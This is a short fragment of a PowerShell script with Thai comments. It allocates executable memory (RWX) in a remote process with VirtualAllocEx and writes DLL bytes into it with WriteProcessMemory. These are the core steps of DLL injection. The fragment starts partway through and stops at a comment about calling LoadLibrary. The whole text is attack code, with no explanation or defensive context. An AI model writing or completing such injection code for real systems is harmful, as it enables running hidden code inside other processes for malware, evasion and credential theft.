...
# จอง memory ขนาดใหญ่ขึ้น (DLL + space)
$allocSize = $dllBytes.Length + 0x1000
$remoteBuffer = [Native]::VirtualAllocEx($hProcess, 0, $allocSize, 0x3000, 0x40)

# เขียน DLL
$bytesWritten = [UIntPtr]::Zero
[Native]::WriteProcessMemory($hProcess, $remoteBuffer, $dllBytes, $dllBytes.Length, [ref]$bytesWritten)

# ใช้ LoadLibrary ปกติ (เหมือนเดิม)
